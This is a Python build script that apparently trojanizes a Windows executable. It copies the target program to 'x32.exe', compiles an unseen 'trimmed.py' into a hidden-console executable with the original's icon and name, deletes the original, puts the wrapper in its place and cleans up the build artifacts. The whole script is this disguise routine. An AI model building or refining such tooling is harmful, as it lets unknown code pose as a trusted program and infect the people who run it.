import PyInstaller.__main__
import argparse
import subprocess
import shutil
import os

parser = argparse.ArgumentParser(description="Make the world a better place.")
parser.add_argument("exe", type=str, help="exe name (including .exe)")
parser.add_argument("ico", type=str, help="icon file (including .ico)")
args = parser.parse_args()
shutil.copy(args.exe, os.path.join(os.getcwd(), "x32.exe"))
trimmed_file = "trimmed.py"
PyInstaller.__main__.run([
    trimmed_file,
    '--onefile',
    '-i', rf'{args.ico}',
    '-n', f'{args.exe}',
    '--noconsole'
])

# Move and replace the original .exe with the new one
exe_path = os.path.join("dist", args.exe)
original_exe = os.path.abspath(args.exe)

if os.path.exists(exe_path):
    if os.path.exists(original_exe):
        os.remove(original_exe)  # Delete old exe
    shutil.move(exe_path, original_exe)  # Move new exe

# Cleanup dist and build folders
shutil.rmtree("dist", ignore_errors=True)
shutil.rmtree("build", ignore_errors=True)

# Remove the .spec file
spec_file = f"{args.exe}.spec"
if os.path.exists(spec_file):
    os.remove(spec_file)
